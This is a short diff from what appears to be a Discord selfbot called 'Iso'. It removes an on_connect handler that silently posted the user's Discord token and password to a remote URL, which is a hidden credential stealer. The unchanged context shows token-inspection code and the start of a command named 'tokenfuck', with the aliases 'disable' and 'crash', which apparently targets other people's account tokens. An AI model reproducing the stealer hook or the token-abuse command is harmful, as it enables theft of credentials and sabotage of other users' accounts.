@@ -932,10 +932,6 @@ async def tokeninfo(ctx, _token):
             em.add_field(name=field['name'], value=field['value'], inline=False)
             em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
     return await ctx.send(embed=em)
-@Iso.event
-async def on_connect():
-  Clear()
-  requests.post('deleted',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"}) 
 @Iso.command(aliases=['tokenfucker', 'disable', 'crash'])
 async def tokenfuck(ctx, _token):
     await ctx.message.delete()
